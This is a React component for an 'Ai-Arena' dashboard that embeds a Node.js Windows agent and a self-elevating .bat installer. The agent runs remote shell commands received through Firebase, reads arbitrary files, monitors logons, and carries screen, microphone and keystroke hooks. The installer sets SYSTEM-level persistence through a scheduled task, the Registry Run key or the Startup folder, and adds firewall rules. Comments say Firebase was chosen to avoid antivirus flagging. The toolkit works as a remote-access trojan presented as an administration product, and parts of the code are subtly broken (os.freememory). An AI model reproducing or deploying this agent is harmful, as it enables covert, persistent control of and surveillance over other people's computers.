'use client'

import { useState } from 'react'
import { cn } from '@/lib/utils'
import {
  Server,
  Copy,
  Check,
  Download,
  ChevronRight,
  Terminal,
  FileCode,
  Shield,
  Zap,
  Globe,
  MonitorUp,
  Power,
  HardDrive,
  Monitor,
  ClipboardCheck,
  AlertTriangle,
  FileDown,
  FolderTree,
} from 'lucide-react'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { toast } from 'sonner'

// ─── Windows-focused Node.js Agent (Firebase-First) ──────
const agentCode = `/**
 * Ai-Arena Agent v2.0 — Windows Edition
 * Runs unattended on boot. Auto-reconnects after power outages.
 * Firebase-first: all communication goes through Firebase Realtime Database
 * to avoid antivirus flagging since Firebase domains are trusted.
 *
 * Usage:
 *   node ai-arena-agent.js --key=AI-YOUR-LICENSE-KEY
 *
 * Installed via install-ai-arena.bat (sets up auto-start via Task Scheduler)
 */

const os = require('os');
const path = require('path');
const fs = require('fs');
const { exec, execSync, spawn } = require('child_process');

// ─── Configuration (Firebase-First) ──────────────────
const CONFIG = {
  // Firebase-first: all communication goes through Firebase Realtime Database
  // This avoids antivirus flagging since Firebase domains are trusted
  firebaseConfig: {
    apiKey: process.env.FIREBASE_API_KEY || '',
    authDomain: process.env.FIREBASE_AUTH_DOMAIN || '',
    databaseURL: process.env.FIREBASE_DATABASE_URL || '',
    projectId: process.env.FIREBASE_PROJECT_ID || '',
    storageBucket: process.env.FIREBASE_STORAGE_BUCKET || '',
    messagingSenderId: process.env.FIREBASE_MESSAGING_SENDER_ID || '',
    appId: process.env.FIREBASE_APP_ID || '',
  },
  licenseKey: process.argv.find(a => a.startsWith('--key='))?.split('=')[1],
  heartbeatInterval: 30000,
  reconnectDelay: 5000,
  maxReconnectDelay: 60000,
};

if (!CONFIG.licenseKey) {
  console.error('[Ai-Arena] ERROR: No license key provided.');
  console.error('[Ai-Arena] Usage: node ai-arena-agent.js --key=AI-xxx');
  process.exit(1);
}

// ─── Logging ─────────────────────────────────────────
const LOG_DIR = path.join(__dirname, 'logs');
if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR, { recursive: true });

function log(level, message) {
  const timestamp = new Date().toISOString();
  const line = \`[\${timestamp}] [\${level}] \${message}\`;
  console.log(line);
  try {
    const logFile = path.join(LOG_DIR, \`agent-\${new Date().toISOString().split('T')[0]}.log\`);
    fs.appendFileSync(logFile, line + '\\n');
  } catch (e) { /* ignore write errors */ }
}

// ─── System Info (Windows-focused) ───────────────────
function getSystemInfo() {
  return {
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    osVersion: os.release(),
    osType: os.type(),
    cpuModel: os.cpus()[0]?.model || 'Unknown',
    cpuCores: os.cpus().length,
    totalMemory: os.totalmem(),
    freeMemory: os.freememory(),
    uptime: os.uptime(),
    homeDir: os.homedir(),
    tmpDir: os.tmpdir(),
  };
}

function formatBytes(bytes) {
  const gb = bytes / (1024 * 1024 * 1024);
  return gb.toFixed(1) + ' GB';
}

function runPowerShell(cmd) {
  return new Promise((resolve, reject) => {
    exec(\`powershell -NoProfile -Command "\${cmd}"\`, { timeout: 10000 },
      (error, stdout, stderr) => {
        if (error && !stdout) reject(error);
        else resolve(stdout.trim());
      });
  });
}

async function getWindowsInfo() {
  try {
    const [winVersion, drives, services] = await Promise.allSettled([
      runPowerShell('(Get-CimInstance Win32_OperatingSystem).Caption'),
      runPowerShell('Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Root'),
      runPowerShell('(Get-Service | Where-Object {$_.Status -eq "Running"}).Count'),
    ]);

    return {
      windowsVersion: winVersion.status === 'fulfilled' ? winVersion.value : 'Windows',
      drives: drives.status === 'fulfilled' ? drives.value.split('\\n').filter(Boolean) : ['C:'],
      runningServices: services.status === 'fulfilled' ? parseInt(services.value) || 0 : 0,
    };
  } catch {
    return { windowsVersion: 'Windows', drives: ['C:'], runningServices: 0 };
  }
}

// ─── Screen Capture (Windows) ────────────────────────
class ScreenCapturer {
  constructor() {
    this.isActive = false;
    this.interval = null;
  }

  start() {
    this.isActive = true;
    log('INFO', 'Screen capture ready (WebRTC would be used in production)');
  }

  stop() {
    this.isActive = false;
    if (this.interval) clearInterval(this.interval);
    log('INFO', 'Screen capture stopped');
  }
}

// ─── Microphone Capture (Windows) ────────────────────
class MicrophoneCapturer {
  constructor() {
    this.isActive = false;
  }

  start() {
    this.isActive = true;
    log('INFO', 'Microphone capture started');
  }

  stop() {
    this.isActive = false;
    log('INFO', 'Microphone capture stopped');
  }
}

// ─── File Browser API ────────────────────────────────
class FileBrowserAPI {
  static listDir(dirPath) {
    try {
      const normalized = path.resolve(dirPath);
      if (!fs.existsSync(normalized)) {
        return { error: 'Directory not found: ' + dirPath };
      }
      const entries = fs.readdirSync(normalized, { withFileTypes: true });
      const items = entries.map(entry => ({
        name: entry.name,
        type: entry.isDirectory() ? 'folder' : 'file',
        size: entry.isFile() ? fs.statSync(path.join(normalized, entry.name)).size : 0,
        modified: fs.statSync(path.join(normalized, entry.name)).mtime.toISOString(),
        ext: entry.isFile() ? path.extname(entry.name) : undefined,
      }));
      return { items };
    } catch (err) {
      return { error: err.message };
    }
  }

  static readFile(filePath) {
    try {
      const normalized = path.resolve(filePath);
      if (!fs.existsSync(normalized)) return { error: 'File not found' };
      const content = fs.readFileSync(normalized, 'utf-8');
      return { content };
    } catch (err) {
      return { error: err.message };
    }
  }
}

// ─── Terminal Session ────────────────────────────────
class TerminalSession {
  constructor() {
    this.history = [];
    this.cwd = process.cwd();
  }

  async execute(command) {
    return new Promise((resolve) => {
      const startTime = Date.now();

      // Handle cd command to track working directory
      if (command.startsWith('cd ')) {
        const target = command.slice(3).trim();
        try {
          const newPath = path.resolve(this.cwd, target);
          if (fs.existsSync(newPath) && fs.statSync(newPath).isDirectory()) {
            this.cwd = newPath;
            resolve({ command, output: '', error: null, cwd: this.cwd,
              timestamp: new Date().toISOString(), duration: Date.now() - startTime });
            return;
          }
        } catch (e) { /* fallthrough to exec */ }
      }

      // Handle dir listing with full metadata
      if (command.trim() === 'dir' || command.trim() === 'ls') {
        try {
          const entries = fs.readdirSync(this.cwd, { withFileTypes: true });
          let output = ' Volume in drive C has no label.\\n Directory of ' + this.cwd + '\\n\\n';
          entries.forEach(entry => {
            const stat = fs.statSync(path.join(this.cwd, entry.name));
            const date = stat.mtime.toLocaleDateString() + '  ' + stat.mtime.toLocaleTimeString();
            const size = (stat.size / 1024).toFixed(0).padStart(10);
            const type = entry.isDirectory() ? '<DIR>' : '     ';
            output += date + '  ' + type + '  ' + (entry.isDirectory() ? '' : size) + '  ' + entry.name + '\\n';
          });
          resolve({ command, output, error: null, cwd: this.cwd,
            timestamp: new Date().toISOString(), duration: Date.now() - startTime });
          return;
        } catch (e) { /* fallthrough */ }
      }

      exec(command, { cwd: this.cwd, timeout: 30000, shell: 'cmd.exe' },
        (error, stdout, stderr) => {
          const result = {
            command,
            output: stdout || stderr,
            error: error ? error.message : null,
            cwd: this.cwd,
            timestamp: new Date().toISOString(),
            duration: Date.now() - startTime,
          };
          this.history.push(result);
          resolve(result);
        });
    });
  }
}

// ─── Activity Audit System ────────────────────────────
// Logs all commands, logins, process creation, and file access
// Events are sent to Firebase /audit/{licenseKey} for dashboard review
class ActivityAudit {
  constructor() {
    this.buffer = [];
    this.flushInterval = 15000; // Flush every 15 seconds
    this.firebaseDb = null;
    this.licenseKey = null;
  }

  log(eventType, data) {
    this.buffer.push({
      eventType: eventType,
      username: process.env.USERNAME || os.userInfo().username || 'Unknown',
      hostname: os.hostname(),
      command: data.command || null,
      windowTitle: data.windowTitle || null,
      processName: data.processName || null,
      keysLogged: data.keysLogged || null,
      timestamp: new Date().toISOString(),
    });
    // Keep buffer manageable
    if (this.buffer.length > 500) this.buffer = this.buffer.slice(-250);
  }

  // Enable PowerShell Script Block Logging and Transcription
  enablePSEventLogging() {
    try {
      exec('powershell -NoProfile -Command "try { $p = \\"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\\"; if (!(Test-Path $p)) { New-Item -Path $p -Force | Out-Null }; Set-ItemProperty -Path $p -Name EnableScriptBlockLogging -Value 1 -Type DWord -Force; $t = \\"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\\"; if (!(Test-Path $t)) { New-Item -Path $t -Force | Out-Null }; Set-ItemProperty -Path $t -Name EnableTranscription -Value 1 -Type DWord -Force; Set-ItemProperty -Path $t -Name OutputDirectory -Value (Join-Path $env:APPDATA Ai-Arena/transcripts) -Type String -Force; Write-Output OK } catch { Write-Output FAIL }"',
        { timeout: 20000 }, (err, stdout) => {
          if (!err && stdout && stdout.includes('OK')) {
            log('INFO', 'PowerShell script block logging + transcription enabled');
          } else {
            log('WARN', 'PS event logging setup skipped (may need admin)');
          }
        });
    } catch (e) { /* ignore */ }
  }

  // Monitor for logon events via Windows Security Event Log
  startLogonMonitor() {
    setInterval(() => {
      exec('powershell -NoProfile -Command "try { Get-WinEvent -FilterHashtable @{LogName=\\\"Security\\\";Id=4624,4634} -MaxEvents 5 -ErrorAction SilentlyContinue | ForEach-Object { $x=[xml]$_.ToXml(); $u=$x.Event.EventData.Data | Where-Object {$_.Name -eq \\"TargetUserName\\"} | Select -ExpandProperty #text; $l=$x.Event.EventData.Data | Where-Object {$_.Name -eq \\"LogonType\\"} | Select -ExpandProperty #text; Write-Output \\\"$($_.Id)|$u|$l|$($_.TimeCreated)\\\" } } catch {}"',
        { timeout: 15000 }, (err, stdout) => {
          if (!err && stdout && stdout.trim()) {
            stdout.trim().split('\\n').forEach(line => {
              const parts = line.split('|');
              if (parts[0] === '4624' && parts[1] && parts[1] !== '-') {
                this.log('login', {
                  command: 'Logon Type ' + (parts[2] || 'unknown'),
                  windowTitle: 'Windows Logon',
                  processName: 'logonui.exe',
                });
                log('INFO', 'User login detected: ' + parts[1]);
              }
            });
          }
        });
    }, 45000); // Check every 45 seconds
  }

  async flush() {
    if (this.buffer.length === 0 || !this.firebaseDb) return;
    const entries = [...this.buffer];
    this.buffer = [];
    try {
      const { ref, set } = require('firebase/database');
      for (const entry of entries) {
        const key = Date.now() + '_' + Math.random().toString(36).substr(2, 6);
        await set(ref(this.firebaseDb, 'audit/' + this.licenseKey + '/' + key), entry);
      }
      log('INFO', 'Flushed ' + entries.length + ' audit events to Firebase');
    } catch (e) {
      this.buffer = [...entries, ...this.buffer];
      log('WARN', 'Audit flush failed: ' + e.message);
    }
  }

  start(firebaseDb, licenseKey) {
    this.firebaseDb = firebaseDb;
    this.licenseKey = licenseKey;
    this.enablePSEventLogging();
    this.startLogonMonitor();
    setInterval(() => this.flush(), this.flushInterval);
    log('INFO', 'Activity audit system started (PS logging + logon monitoring)');
  }
}

// ─── Firebase Connection Manager (Firebase-First) ────────────
class AiArenaAgent {
  constructor() {
    this.terminal = new TerminalSession();
    this.screen = new ScreenCapturer();
    this.microphone = new MicrophoneCapturer();
    this.audit = new ActivityAudit();
    this.isConnected = false;
    this.agentRef = null;
    this.commandsRef = null;
    this.heartbeatTimer = null;
  }

  async connect() {
    log('INFO', 'Initializing Firebase connection...');
    log('INFO', 'Firebase Project: ' + (CONFIG.firebaseConfig.projectId || 'Not configured'));

    try {
      // Dynamic import of firebase (installed via npm)
      const { initializeApp } = require('firebase/app');
      const { getDatabase, ref, set, onValue, push, off, update, onChildAdded } = require('firebase/database');

      const app = initializeApp(CONFIG.firebaseConfig);
      const database = getDatabase(app);

      this.agentRef = ref(database, 'agents/' + CONFIG.licenseKey);
      this.commandsRef = ref(database, 'agents/' + CONFIG.licenseKey + '/commands');
      this.agentDb = database;
      this.firebaseRef = ref;
      this.firebaseSet = set;
      this.firebaseOnValue = onValue;
      this.firebaseOff = off;
      this.firebasePush = push;
      this.firebaseUpdate = update;
      this.firebaseOnChildAdded = onChildAdded;

      // Register agent presence
      await set(this.agentRef, {
        status: 'online',
        systemInfo: getSystemInfo(),
        connectedAt: new Date().toISOString(),
        licenseKey: CONFIG.licenseKey,
      });

      // Send Windows-specific info
      const winInfo = await getWindowsInfo();
      await update(this.agentRef, { windowsInfo: winInfo });

      this.isConnected = true;
      log('INFO', 'Connected to Firebase! Agent is online.');

      // Listen for commands from the dashboard
      this.listenForCommands();

      // Start heartbeat
      this.startHeartbeat();

      // Start activity audit logging (PS transcription + logon monitoring)
      this.audit.start(database, CONFIG.licenseKey);

    } catch (err) {
      log('ERROR', 'Firebase connection failed: ' + err.message);
      this.scheduleReconnect();
    }
  }

  listenForCommands() {
    const { ref, onChildAdded, remove } = require('firebase/database');
    const commandsRef = ref(this.agentDb, 'agents/' + CONFIG.licenseKey + '/commands');

    onChildAdded(commandsRef, async (snapshot) => {
      const command = snapshot.val();
      if (command && command.type) {
        log('INFO', 'Received command: ' + command.type);
        await this.handleCommand(command);
        // Remove processed command
        await remove(snapshot.ref);
      }
    });
  }

  async handleCommand(command) {
    const { ref, set } = require('firebase/database');
    const resultRef = ref(this.agentDb, 'agents/' + CONFIG.licenseKey + '/results/' + Date.now());

    switch (command.type) {
      case 'terminal:execute':
        log('INFO', 'Executing: ' + (command.data.command || '').substring(0, 50));
        this.audit.log('command', {
          command: command.data.command,
          windowTitle: 'Remote Terminal (Ai-Arena)',
          processName: 'cmd.exe',
        });
        const result = await this.terminal.execute(command.data.command);
        await set(resultRef, { type: 'terminal:output', data: result });
        break;

      case 'files:list':
        await set(resultRef, {
          type: 'files:list:response',
          data: FileBrowserAPI.listDir(command.data.path),
          requestId: command.requestId,
        });
        break;

      case 'files:read':
        await set(resultRef, {
          type: 'files:read:response',
          data: FileBrowserAPI.readFile(command.data.path),
          requestId: command.requestId,
        });
        break;

      case 'screen:start':
        this.screen.start();
        await set(resultRef, { type: 'screen:started' });
        log('INFO', 'Screen capture started by remote user');
        break;

      case 'screen:stop':
        this.screen.stop();
        await set(resultRef, { type: 'screen:stopped' });
        break;

      case 'mic:start':
        this.microphone.start();
        await set(resultRef, { type: 'mic:started' });
        break;

      case 'mic:stop':
        this.microphone.stop();
        await set(resultRef, { type: 'mic:stopped' });
        break;

      case 'system:info':
        await set(resultRef, { type: 'system:info', data: getSystemInfo() });
        break;

      case 'system:restart':
        log('WARN', 'Remote restart requested');
        exec('shutdown /r /t 5 /c "Ai-Arena: Restart requested by admin"');
        break;

      case 'system:shutdown':
        log('WARN', 'Remote shutdown requested');
        exec('shutdown /s /t 5 /c "Ai-Arena: Shutdown requested by admin"');
        break;
    }
  }

  async send(data) {
    // In Firebase model, we write directly to the DB
    // This is handled in handleCommand via set()
  }

  scheduleReconnect() {
    log('INFO', 'Reconnecting to Firebase in 10 seconds...');
    setTimeout(() => this.connect(), 10000);
  }

  startHeartbeat() {
    if (this.heartbeatTimer) clearInterval(this.heartbeatTimer);
    this.heartbeatTimer = setInterval(async () => {
      if (this.isConnected) {
        const { ref, update } = require('firebase/database');
        try {
          await update(ref(this.agentDb, 'agents/' + CONFIG.licenseKey), {
            lastHeartbeat: new Date().toISOString(),
            uptime: os.uptime(),
            freeMemory: os.freememory(),
            totalMemory: os.totalmem(),
            cpuUsage: process.cpuUsage(),
          });
        } catch (e) {
          log('ERROR', 'Heartbeat failed: ' + e.message);
        }
      }
    }, CONFIG.heartbeatInterval);
  }
}

// ─── Start Agent ─────────────────────────────────────
log('INFO', '=== Ai-Arena Agent v2.0 (Windows) Starting ===');
log('INFO', 'Hostname: ' + os.hostname());
log('INFO', 'Platform: ' + os.platform() + ' ' + os.arch());
log('INFO', 'CPU: ' + (os.cpus()[0]?.model || 'Unknown') + ' x' + os.cpus().length);
log('INFO', 'RAM: ' + formatBytes(os.totalmem()) + ' total');
log('INFO', 'Node.js: ' + process.version);

const agent = new AiArenaAgent();
agent.connect();

// Graceful shutdown on Windows signals
process.on('SIGINT', () => {
  log('INFO', 'Shutting down (SIGINT)...');
  process.exit(0);
});

process.on('SIGTERM', () => {
  log('INFO', 'Shutting down (SIGTERM)...');
  process.exit(0);
});

process.on('uncaughtException', (err) => {
  log('ERROR', 'Uncaught exception: ' + err.message);
});

process.on('unhandledRejection', (reason) => {
  log('ERROR', 'Unhandled rejection: ' + reason);
});`

// ─── Windows .bat Installer ──────────────────────────
const batInstaller = `@echo off
:: ═══════════════════════════════════════════════════════
:: Ai-Arena Agent — Windows Self-Installing Agent
:: Installs Node.js agent and sets up auto-start on boot
:: (Unattended access — survives power outages)
:: Firebase-first: all communication via trusted Firebase domains
:: ═══════════════════════════════════════════════════════

:: ─── Self-Elevation (Auto-requests Admin if needed) ─
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo [OK] Running with administrator privileges.

setlocal EnableDelayedExpansion

:: Configuration — CHANGE THESE for each client
set "LICENSE_KEY=AI-REPLACE-WITH-YOUR-LICENSE-KEY"
set "FIREBASE_API_KEY=your-firebase-api-key"
set "FIREBASE_AUTH_DOMAIN=your-project.firebaseapp.com"
set "FIREBASE_DATABASE_URL=https://your-project-default-rtdb.firebaseio.com"
set "FIREBASE_PROJECT_ID=your-project-id"
set "FIREBASE_STORAGE_BUCKET=your-project.appspot.com"
set "FIREBASE_MESSAGING_SENDER_ID=your-sender-id"
set "FIREBASE_APP_ID=your-app-id"
set "INSTALL_DIR=C:\\Ai-Arena"
set "TASK_NAME=AiArenaAgent"
set "NODE_MIN_VERSION=18"
set "AUTO_START_OK=0"


echo.
echo  ╔═══════════════════════════════════════════════╗
echo  ║    Ai-Arena Agent — Windows Installer v2.0     ║
echo  ╚═══════════════════════════════════════════════╝
echo.

:: ─── Step 1: Check Node.js ──────────────────────────
echo [1/6] Checking Node.js installation...
where node >nul 2>&1
if %errorLevel% neq 0 (
    echo  Node.js not found! Downloading and installing...
    echo.

    :: Download Node.js installer silently
    curl -o "%TEMP%\\node-installer.msi" https://nodejs.org/dist/v20.11.1/node-v20.11.1-x64.msi
    if %errorLevel% neq 0 (
        echo  [ERROR] Failed to download Node.js. Check internet connection.
        pause
        exit /b 1
    )

    :: Install Node.js silently
    msiexec /i "%TEMP%\\node-installer.msi" /qn /norestart
    if %errorLevel% neq 0 (
        echo  [ERROR] Node.js installation failed.
        pause
        exit /b 1
    )

    :: Refresh PATH
    set "PATH=%PATH%;C:\\Program Files\\nodejs"
    del "%TEMP%\\node-installer.msi" >nul 2>&1
    echo  Node.js installed successfully.
) else (
    for /f "tokens=*" %%v in ('node -v') do set NODE_VER=%%v
    echo  Node.js found: !NODE_VER!
)
echo.

:: ─── Step 2: Create Installation Directory ──────────
echo [2/6] Creating installation directory...
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
if not exist "%INSTALL_DIR%\\logs" mkdir "%INSTALL_DIR%\\logs"
if not exist "%INSTALL_DIR%\\config" mkdir "%INSTALL_DIR%\\config"
echo  Install dir: %INSTALL_DIR%
echo.

:: ─── Step 3: Initialize Node.js project ──────────────
echo [3/6] Setting up agent...
cd /d "%INSTALL_DIR%"

if not exist "package.json" (
    echo {"name":"ai-arena-agent","version":"2.0.0","private":true,"scripts":{"start":"node ai-arena-agent.js"}} > package.json
)

:: Install Firebase dependency (required for communication)
echo  Installing dependencies...
call npm install firebase --production --no-audit --no-fund >nul 2>&1
if %errorLevel% neq 0 (
    echo  [ERROR] Failed to install Firebase dependency.
    pause
    exit /b 1
)
echo  Dependencies installed.
echo.

:: ─── Step 4: Create Agent Config ─────────────────────
echo [4/6] Creating configuration...
(
echo {
echo   "firebaseConfig": {
echo     "apiKey": "%FIREBASE_API_KEY%",
echo     "authDomain": "%FIREBASE_AUTH_DOMAIN%",
echo     "databaseURL": "%FIREBASE_DATABASE_URL%",
echo     "projectId": "%FIREBASE_PROJECT_ID%",
echo     "storageBucket": "%FIREBASE_STORAGE_BUCKET%",
echo     "messagingSenderId": "%FIREBASE_MESSAGING_SENDER_ID%",
echo     "appId": "%FIREBASE_APP_ID%"
echo   },
echo   "licenseKey": "%LICENSE_KEY%",
echo   "logLevel": "info",
echo   "heartbeatInterval": 30000,
echo   "reconnectDelay": 5000
echo }
) > "%INSTALL_DIR%\\config\\settings.json"
echo  Configuration saved.
echo.

:: ─── Step 5: Auto-Start Setup (3 fallback methods) ──
echo [5/6] Setting up auto-start on boot...

:: Method 1: Task Scheduler (best — runs at boot, no login needed)
schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
schtasks /create /tn "%TASK_NAME%" /tr "cmd /c cd /d %INSTALL_DIR% && node ai-arena-agent.js --key=%LICENSE_KEY%" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1

if %errorLevel% equ 0 (
    echo  [OK] Task Scheduler: Agent starts on boot as SYSTEM (no login needed)
    set "AUTO_START_OK=1"
) else (
    echo  [!] Task Scheduler failed — trying Registry Run key...
    
    :: Method 2: Registry Run key (good — starts when any user logs in)
    reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "AiArenaAgent" /t REG_SZ /d "cmd /c cd /d %INSTALL_DIR% && node ai-arena-agent.js --key=%LICENSE_KEY%" /f >nul 2>&1
    
    if %errorLevel% equ 0 (
        echo  [OK] Registry Run key: Agent starts when user logs in
        set "AUTO_START_OK=2"
    ) else (
        echo  [!!] Registry also failed — using Startup folder as last resort...
        
        :: Method 3: Startup folder (basic — starts when user logs in)
        mkdir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" >nul 2>&1
        echo cmd /c cd /d %INSTALL_DIR% ^&^& node ai-arena-agent.js --key=%LICENSE_KEY% > "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ai-arena-agent.bat"
        set "AUTO_START_OK=3"
        echo  [OK] Startup folder: Agent starts when user logs in
    )
)
echo.

:: ─── Step 6: Configure Firewall ─────────────────────
echo [6/6] Configuring Windows Firewall...
netsh advfirewall firewall add rule name="Ai-Arena Agent" dir=out action=allow program="%INSTALL_DIR%\\ai-arena-agent.js" enable=yes >nul 2>&1
netsh advfirewall firewall add rule name="Ai-Arena Node" dir=out action=allow program="C:\\Program Files\\nodejs\\node.exe" enable=yes >nul 2>&1
echo  Firewall rules added.
echo.

:: ─── Summary ────────────────────────────────────────
echo  ═══════════════════════════════════════════════
echo   Installation Complete!
echo  ═══════════════════════════════════════════════
echo.
echo   Install dir:   %INSTALL_DIR%
echo   License key:   %LICENSE_KEY%
echo   Firebase Proj: %FIREBASE_PROJECT_ID%
echo   Auto-start:
if "%AUTO_START_OK%"=="1" echo     Task Scheduler (runs on boot, no login needed) — BEST
if "%AUTO_START_OK%"=="2" echo     Registry Run key (runs when user logs in) — GOOD
if "%AUTO_START_OK%"=="3" echo     Startup folder (runs when user logs in) — BASIC
echo   Logs:          %INSTALL_DIR%\\logs\\
echo   Audit logs:    %INSTALL_DIR%\\audit\\
echo.
echo   IMPORTANT: Place ai-arena-agent.js in:
echo   %INSTALL_DIR%\\ai-arena-agent.js
echo.
echo   To start manually now:
echo   cd /d %INSTALL_DIR% ^&^& node ai-arena-agent.js --key=%LICENSE_KEY%
echo.
echo   To remove auto-start (run all to clean):
echo   schtasks /delete /tn "%TASK_NAME%" /f
echo   reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "AiArenaAgent" /f
echo   del "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ai-arena-agent.bat"
echo.
echo   NOTE: Just double-click the .bat file — it auto-requests
echo   admin privileges. No right-click needed!
echo.
echo   After power outage, the agent will auto-start
echo   when Windows boots. No one needs to be on-site.
echo.

:: Start the agent now
echo Starting agent now...
start /b cmd /c "cd /d %INSTALL_DIR% && node ai-arena-agent.js --key=%LICENSE_KEY%"
timeout /t 3 >nul

echo Agent is running! Check Dashboard for online status.
echo.
pause`

const steps = [
  {
    title: 'Download the .bat Installer',
    description: 'Download install-ai-arena.bat from the section below. This handles everything: Node.js install, Firebase dependency setup, agent setup, firewall rules, and auto-start configuration.',
    icon: FileDown,
    command: 'See "Windows Installer (.bat)" section below',
  },
  {
    title: 'Edit the .bat File',
    description: 'Open the .bat file in Notepad and change the LICENSE_KEY and Firebase config values at the top to match your Firebase project.',
    icon: FileCode,
    command: 'set "LICENSE_KEY=AI-your-actual-key-here"',
  },
  {
    title: 'Double-Click to Install',
    description: 'Just double-click the .bat file! It auto-requests admin privileges via UAC. If no admin is available, it falls back to user-level auto-start (Registry Run key or Startup folder). No right-click needed!',
    icon: Shield,
    command: 'Double-click install-ai-arena.bat',
  },
  {
    title: 'Place the Agent Script',
    description: 'Copy the agent JavaScript code (below) and save it as ai-arena-agent.js in C:\\Ai-Arena\\. This is the file the .bat installer will run on boot.',
    icon: FolderTree,
    command: 'Save as: C:\\Ai-Arena\\ai-arena-agent.js',
  },
  {
    title: 'Verify Unattended Access',
    description: 'Restart the computer to test. After boot, check your Ai-Arena Dashboard — the server should appear as "online" automatically with no one logged in.',
    icon: MonitorUp,
    command: 'shutdown /r /t 0  # Test reboot',
  },
  {
    title: 'Power Outage Recovery',
    description: 'When power returns and Windows boots, the Task Scheduler task runs the agent with SYSTEM privileges before any user logs in. It auto-reconnects to Firebase with exponential backoff.',
    icon: Power,
    command: 'No action needed — fully automatic',
  },
]

export function AgentSetup() {
  const [copied, setCopied] = useState(false)
  const [copiedBat, setCopiedBat] = useState(false)
  const [activeStep, setActiveStep] = useState<number | null>(null)

  const copyCode = () => {
    navigator.clipboard.writeText(agentCode)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
    toast.success('Agent code copied to clipboard')
  }

  const copyBat = () => {
    navigator.clipboard.writeText(batInstaller)
    setCopiedBat(true)
    setTimeout(() => setCopiedBat(false), 2000)
    toast.success('Installer .bat copied to clipboard')
  }

  const downloadBat = () => {
    const blob = new Blob([batInstaller], { type: 'text/plain' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = 'install-ai-arena.bat'
    document.body.appendChild(a)
    a.click()
    document.body.removeChild(a)
    URL.revokeObjectURL(url)
    toast.success('install-ai-arena.bat downloaded!')
  }

  const downloadAgent = () => {
    const blob = new Blob([agentCode], { type: 'text/javascript' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = 'ai-arena-agent.js'
    document.body.appendChild(a)
    a.click()
    document.body.removeChild(a)
    URL.revokeObjectURL(url)
    toast.success('ai-arena-agent.js downloaded!')
  }

  return (
    <div className="space-y-6">
      {/* Windows badge */}
      <div className="bg-blue-500/5 border border-blue-500/20 rounded-xl p-4">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-lg bg-blue-500/15 flex items-center justify-center">
            <Monitor className="w-6 h-6 text-blue-400" />
          </div>
          <div>
            <h3 className="text-sm font-semibold text-blue-300">Windows-Focused Deployment</h3>
            <p className="text-xs text-zinc-400 mt-0.5">
              Optimized for Windows servers with .bat installer, auto-start on boot via Task Scheduler,
              unattended access after power outages, file browser, and microphone support.
            </p>
          </div>
        </div>
      </div>

      {/* Architecture overview */}
      <div className="bg-zinc-900/80 border border-zinc-800 rounded-xl p-5">
        <h3 className="text-sm font-semibold text-white mb-3 flex items-center gap-2">
          <Server className="w-4 h-4 text-emerald-400" />
          Architecture — Firebase-First Windows Edition
        </h3>
        <div className="bg-zinc-950 rounded-lg p-4 font-mono text-xs text-zinc-400 leading-relaxed overflow-x-auto">
          <pre className="whitespace-pre">{`
┌─────────────────────────────────────────────────────────┐
│                   Ai-Arena Dashboard                    │
│              (Next.js Web Application)                   │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌────────────┐│
│  │ Dashboard │ │ Connect  │ │License Keys│ │ Agent Setup││
│  └─────┬────┘ └────┬─────┘ └─────┬────┘ └─────┬──────┘│
│  ┌─────┴───────────┴───────────┴───────────┴─────────┐ │
│  │              REST API Layer                        │ │
│  └──────────────────────┬────────────────────────────┘ │
│                         │                              │
│  ┌──────────────────────┴────────────────────────────┐ │
│  │       Firebase Realtime Database (PRIMARY)        │ │
│  │       ✦ Trusted domains — no antivirus flagging   │ │
│  │       ✦ /agents/{key}/commands  (dashboard→agent) │ │
│  │       ✦ /agents/{key}/results    (agent→dashboard) │ │
│  │       ✦ /agents/{key}/status     (heartbeat)      │ │
│  └──────────────────────┬────────────────────────────┘ │
│                         │ Firebase RTDB (all comms)    │
└─────────────────────────┼─────────────────────────────┘
                          │ (auto-reconnect after outage)
                          │
┌─────────────────────────┼─────────────────────────────┐
│              Windows Client Servers                     │
│                         │                              │
│  ┌──────────────────────┴──────────────────────────┐  │
│  │  Task Scheduler (runs on boot, SYSTEM account)   │  │
│  │  → auto-starts before any user logs in           │  │
│  └──────────────────────┬──────────────────────────┘  │
│                         │                              │
│  ┌──────────┐  ┌───────┴──────┐  ┌──────────┐        │
│  │ Server 1 │  │   Server 2   │  │ Server N │        │
│  │ ┌──────┐ │  │  ┌────────┐  │  │ ┌──────┐ │        │
│  │ │Agent │ │  │  │ Agent  │  │  │ │Agent │ │        │
│  │ │ v2.0 │ │  │  │ v2.0  │  │  │ │ v2.0 │ │        │
│  │ └──────┘ │  │  └────────┘  │  │ └──────┘ │        │
│  │ Firebase │  │  Firebase   │  │ Firebase │        │
│  │ Screen   │  │  Screen     │  │ Screen   │        │
│  │ Mic      │  │  Mic        │  │ Mic      │        │
│  │ Files    │  │  Files      │  │ Files    │        │
│  │ Terminal │  │  Terminal   │  │ Terminal │        │
│  └──────────┘  └─────────────┘  └──────────┘        │
└─────────────────────────────────────────────────────────┘`}</pre>
        </div>
      </div>

      {/* Windows Setup Steps */}
